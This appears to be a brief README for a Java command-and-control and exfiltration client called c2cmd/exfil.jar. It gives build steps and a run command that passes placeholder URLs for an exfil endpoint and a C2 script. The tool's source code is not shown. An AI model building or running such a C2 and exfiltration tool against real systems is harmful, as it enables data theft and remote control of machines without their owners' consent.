# c2cmd-java

```Your Urls have to be added to the Java source code.```

To create the jar and run within its own directory:

```
javac c2cmd.java
jar -cvmf exfil.mf exfil.jar *
```
To run it (with you url changes compiled above) 
```
java -jar exfil.jar
```
or run it like
```
java -jar exfil.jar https://SOMEHOST/exfilparams https://SHOMEHOST/exploit/c2/2c.php?get=1 https://SOMEHOST/exploit/c2/c2.txt 2
```
